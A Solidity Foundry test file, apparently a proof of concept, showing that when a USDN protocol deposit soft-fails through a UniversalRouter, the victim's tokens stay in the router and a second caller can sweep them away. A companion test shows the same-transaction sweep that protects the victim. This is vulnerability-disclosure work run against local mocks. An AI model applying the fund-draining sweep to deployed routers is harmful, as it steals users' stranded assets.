// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;

import { Test } from "forge-std/Test.sol";
import { Constants } from "@uniswap/universal-router/contracts/libraries/Constants.sol";
import { IUsdnProtocol } from "usdn-contracts/src/interfaces/UsdnProtocol/IUsdnProtocol.sol";
import { IUsdnProtocolTypes } from "usdn-contracts/src/interfaces/UsdnProtocol/IUsdnProtocolTypes.sol";
import { IWusdn } from "usdn-contracts/src/interfaces/Usdn/IWusdn.sol";

import { UniversalRouter } from "../src/UniversalRouter.sol";
import { Commands } from "../src/libraries/Commands.sol";
import { RouterParameters } from "../src/base/RouterImmutables.sol";
import { IUsdnProtocolRouterTypes } from "../src/interfaces/usdn/IUsdnProtocolRouterTypes.sol";
import { IPaymentLibTypes } from "../src/interfaces/usdn/IPaymentLibTypes.sol";
import { ISmardexFactory } from "../src/interfaces/smardex/ISmardexFactory.sol";

contract MockToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "balance");
        unchecked {
            balanceOf[msg.sender] -= amount;
            balanceOf[to] += amount;
        }
        return true;
    }

    // Needed only by the deployed Router's LidoImmutables constructor.
    function stETH() external pure returns (address) {
        return address(0x5700);
    }
}

contract MockWusdn {
    function USDN() external pure returns (address) {
        return address(0xD00D);
    }
}

/// Models the externally-observable USDN behavior when liquidations remain pending:
/// state work happens, the action returns false, and no payment callback is made.
contract SoftFailProtocol {
    address public immutable asset;
    uint256 public softFailCalls;

    constructor(address asset_) {
        asset = asset_;
    }

    function getAsset() external view returns (address) {
        return asset;
    }

    function getSdex() external pure returns (address) {
        return address(0x5D3E);
    }

    fallback() external payable {
        softFailCalls++;
        assembly ("memory-safe") {
            mstore(0, 0)
            return(0, 32)
        }
    }
}

contract TestRouterSoftFailSweepPoC is Test {
    UniversalRouter internal router;
    MockToken internal asset;
    SoftFailProtocol internal protocol;
    MockWusdn internal wusdn;

    address internal constant VICTIM = address(0xA11CE);
    address internal constant ATTACKER = address(0xB0B);
    uint256 internal constant VICTIM_AMOUNT = 1 ether;

    function setUp() public {
        asset = new MockToken();
        protocol = new SoftFailProtocol(address(asset));
        wusdn = new MockWusdn();

        RouterParameters memory rp = RouterParameters({
            permit2: address(0x1001),
            weth9: address(0x1002),
            v2Factory: address(0x1003),
            v3Factory: address(0x1004),
            pairInitCodeHash: bytes32(uint256(1)),
            poolInitCodeHash: bytes32(uint256(2)),
            usdnProtocol: IUsdnProtocol(address(protocol)),
            wstEth: address(asset),
            wusdn: IWusdn(address(wusdn)),
            smardexFactory: ISmardexFactory(address(0x1005))
        });
        router = new UniversalRouter(rp);
        asset.mint(VICTIM, VICTIM_AMOUNT);
    }

    function _softFailDepositInput(address to, address validator) internal pure returns (bytes memory) {
        bytes[] memory priceData = new bytes[](0);
        uint128[] memory rawIndices = new uint128[](0);
        IUsdnProtocolTypes.PreviousActionsData memory previousActions =
            IUsdnProtocolTypes.PreviousActionsData({ priceData: priceData, rawIndices: rawIndices });

        return abi.encode(
            IUsdnProtocolRouterTypes.InitiateDepositData({
                payment: IPaymentLibTypes.PaymentType.Transfer,
                amount: Constants.CONTRACT_BALANCE,
                sharesOutMin: 0,
                to: to,
                validator: validator,
                deadline: type(uint256).max,
                currentPriceData: "",
                previousActionsData: previousActions,
                ethAmount: 0
            })
        );
    }

    function test_softFailLeavesVictimAssetSweepableByNextCaller() public {
        vm.prank(VICTIM);
        asset.transfer(address(router), VICTIM_AMOUNT);

        bytes memory commands = abi.encodePacked(uint8(Commands.INITIATE_DEPOSIT));
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = _softFailDepositInput(VICTIM, VICTIM);

        vm.prank(VICTIM);
        router.execute(commands, inputs);

        assertEq(protocol.softFailCalls(), 1, "protocol action executed and soft-failed");
        assertEq(asset.balanceOf(address(router)), VICTIM_AMOUNT, "victim funds remain in shared router custody");

        bytes memory sweepCommands = abi.encodePacked(uint8(Commands.SWEEP));
        bytes[] memory sweepInputs = new bytes[](1);
        sweepInputs[0] = abi.encode(address(asset), ATTACKER, 0, 0);

        vm.prank(ATTACKER);
        router.execute(sweepCommands, sweepInputs);

        assertEq(asset.balanceOf(ATTACKER), VICTIM_AMOUNT, "next caller sweeps victim funds");
        assertEq(asset.balanceOf(address(router)), 0, "router drained");
    }

    function test_sameTransactionSweepProtectsVictimOnSoftFail() public {
        vm.prank(VICTIM);
        asset.transfer(address(router), VICTIM_AMOUNT);

        bytes memory commands = abi.encodePacked(uint8(Commands.INITIATE_DEPOSIT), uint8(Commands.SWEEP));
        bytes[] memory inputs = new bytes[](2);
        inputs[0] = _softFailDepositInput(VICTIM, VICTIM);
        inputs[1] = abi.encode(address(asset), VICTIM, 0, 0);

        vm.prank(VICTIM);
        router.execute(commands, inputs);

        assertEq(protocol.softFailCalls(), 1, "protocol action executed and soft-failed");
        assertEq(asset.balanceOf(address(router)), 0, "cleanup sweep empties router");
        assertEq(asset.balanceOf(VICTIM), VICTIM_AMOUNT, "victim receives stranded asset back atomically");
    }
}
